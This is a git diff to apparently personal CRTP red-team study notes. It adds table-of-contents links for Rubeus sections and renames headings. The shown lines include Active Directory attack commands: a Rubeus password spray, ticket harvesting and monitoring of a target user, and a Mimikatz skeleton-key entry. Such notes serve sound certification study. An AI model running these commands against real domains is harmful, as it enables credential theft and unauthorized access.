@@ -21,7 +21,12 @@
   - [Silver](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#silver)
   - [Invoke-Mimikatz.ps1](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#invoke-mimikatz)
   - [Misc Attacks](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#mimikatz---misc-attacks)
-- [Rubeus]()
+- [Rubeus](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#rubeus)
+  - [Brute](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#basic)
+  - [Pass-the-key/O-PTH](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#pass-the-keyover-pth)
+  - [Roasting](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#roasting)
+  - [Golden/Silver](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#goldensilver)
+  - Maintenance(https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#maintenance)
 - [ACLs](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#check-acls)
   - [PowerView get-DomainObjectACL](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#powerview-tips-on-domainobjectacl)
   - [Further ACL Enumeration](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#further-acl-enumeration)
@@ -444,11 +449,12 @@ misc::skeleton
 # Rubeus
 https://www.hackingarticles.in/a-detailed-guide-on-rubeus/
 
-#### Basic
+#### Brute
 Brute Password spray:
 
 ```Rubeus.exe brute /password:Password01 /noticket```
 
+#### List tickets
 Get tickets currently on System:
 - All - ```Rubeus.exe harvest /interval:30```
 - Specific User - ```rubeus.exe monitor /targetuser:Mary /interval:10 /nowrap```
